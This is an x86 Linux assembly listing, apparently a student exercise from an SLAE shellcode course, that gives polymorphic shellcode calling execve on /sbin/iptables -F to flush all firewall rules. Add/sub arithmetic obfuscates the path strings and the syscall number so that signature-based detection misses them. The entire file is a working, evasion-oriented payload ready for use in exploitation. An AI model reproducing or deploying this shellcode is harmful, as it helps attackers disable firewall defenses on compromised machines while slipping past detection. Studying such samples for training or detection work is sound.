; Shellcode Title: Polymorphic shellcode iptables -F
; Date: 24-02-2018
; Student Id: SLAE-1058
; Tested on: Ubuntu 12.04 LTS x86

global _start

section .text

_start:

	; set eax to zero
	xor eax,eax

	; push null to stack
	push eax
	; push F- to stack
	push word 0x462d
	; pointer to args
	mov esi,esp

	; push null bytes to stack
	push eax

	; push ///sbin/iptables to stack

	push dword 0x73656c62
	push dword 0x61747069
	

	; push dword 0x2f6e6962	; /nib
	xor edi, edi
	mov edi, 0x1d3a12ea 
	add edi, 0x12345678
	push edi

	; push dword 0x732f2f2f	; s///
	mov edi, 0x85605241
	sub edi, 0x12312312
	push edi

	; ebx points to ///sbin/iptables
	mov ebx,esp

	; push null
	push eax
	; push pointer to F-
	push esi
	; push pointer to ///sbin/iptables
	push ebx

	; preparing call syscall
	mov ecx,esp
	mov edx,eax
	; we change al value from 0xb (execve) to 0xd (time)
	mov al, 0xd
	sub al, 0x2
	int 0x80

